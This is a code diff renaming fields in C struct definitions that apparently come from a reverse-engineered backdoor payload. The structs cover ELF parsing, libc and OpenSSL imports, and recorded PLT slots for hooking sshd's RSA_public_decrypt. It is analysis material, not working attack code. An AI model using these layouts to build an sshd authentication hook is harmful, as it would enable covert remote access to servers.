@@ -744,40 +744,39 @@ typedef struct __attribute__((packed)) dasm_ctx {
  */
 typedef struct __attribute__((packed)) elf_info {
  Elf64_Ehdr *elfbase;
- u64 first_vaddr;
+ u64 load_base_vaddr;
  Elf64_Phdr *phdrs;
- u64 e_phnum;
- Elf64_Dyn *dyn;
- u64 dyn_num_entries;
- char *strtab;
- Elf64_Sym *symtab;
+ u64 phdr_count;
+ Elf64_Dyn *dynamic_segment;
+ u64 dyn_entry_count;
+ char *dynstr;
+ Elf64_Sym *dynsym;
  Elf64_Rela *plt_relocs;
- u32 plt_relocs_num;
- BOOL gnurelro_found;
+ u32 plt_reloc_count;
+ BOOL gnurelro_present;
  u64 gnurelro_vaddr;
  u64 gnurelro_memsize;
  Elf64_Verdef *verdef;
- u64 verdef_num;
+ u64 verdef_count;
  Elf64_Versym *versym;
  Elf64_Rela *rela_relocs;
- u32 rela_relocs_num;
- u32 _unused0;
+ u32 rela_reloc_count;
+ u32 relr_reserved0;
  Elf64_Relr *relr_relocs;
- u32 relr_relocs_num;
- u8 _unknown920[4];
- u64 code_segment_start;
- u64 code_segment_size;
+ u32 relr_reloc_count;
+ u32 relr_reserved1;
+ u64 text_segment_start;
+ u64 text_segment_size;
  u64 rodata_segment_start;
  u64 rodata_segment_size;
  u64 data_segment_start;
  u64 data_segment_size;
- u64 data_segment_alignment;
- u8 flags;
- u8 _unknown939[7];
+ u64 data_segment_padding;
+ u64 feature_flags;
  u32 gnu_hash_nbuckets;
  u32 gnu_hash_last_bloom;
  u32 gnu_hash_bloom_shift;
- u8 _unknown949[4];
+ u32 gnu_hash_reserved;
  u64 *gnu_hash_bloom;
  u32 *gnu_hash_buckets;
  u32 *gnu_hash_chain;
@@ -815,7 +814,7 @@ typedef int (*pfn_shutdown_t)(int sockfd, int how);
  */
 typedef struct __attribute__((packed)) libc_imports {
  u32 resolved_imports_count;
- u8 _unknown993[4];
+ u32 reserved_imports_padding;
  pfn_malloc_usable_size_t malloc_usable_size;
  pfn_getuid_t getuid;
  pfn_exit_t exit;
@@ -921,19 +920,19 @@ typedef void (*pfn_BN_free_t)(BIGNUM *a);
  * All non-libc function pointers the payload needs (RSA/EVP/BN helpers, chacha decrypt, etc.) plus access to the owning `libc_imports_t` so callers can reach both sets via one pointer.
  */
 typedef struct __attribute__((packed)) imported_funcs {
- pfn_RSA_public_decrypt_t RSA_public_decrypt;
- pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;
- pfn_RSA_get0_key_t RSA_get0_key_null;
- pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt;
- pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt;
- pfn_RSA_get0_key_t *RSA_get0_key_plt;
+ pfn_RSA_public_decrypt_t RSA_public_decrypt_orig;
+ pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA_orig;
+ pfn_RSA_get0_key_t RSA_get0_key_orig;
+ pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt; /* Non-NULL once the loader records sshd’s RSA_public_decrypt PLT slot */
+ pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt; /* Populated when the EVP_PKEY_set1_RSA PLT entry is located */
+ pfn_RSA_get0_key_t *RSA_get0_key_plt; /* Set after we capture RSA_get0_key’s PLT so the hook can fall back safely */
  pfn_DSA_get0_pqg_t DSA_get0_pqg;
  pfn_DSA_get0_pub_key_t DSA_get0_pub_key;
  pfn_EC_POINT_point2oct_t EC_POINT_point2oct;
  pfn_EC_KEY_get0_public_key_t EC_KEY_get0_public_key;
  pfn_EC_KEY_get0_group_t EC_KEY_get0_group;
  pfn_EVP_sha256_t EVP_sha256;
- pfn_RSA_get0_key_t RSA_get0_key;
+ pfn_RSA_get0_key_t RSA_get0_key_resolved;
  pfn_BN_num_bits_t BN_num_bits;
  pfn_EVP_PKEY_new_raw_public_key_t EVP_PKEY_new_raw_public_key;
  pfn_EVP_MD_CTX_new_t EVP_MD_CTX_new;
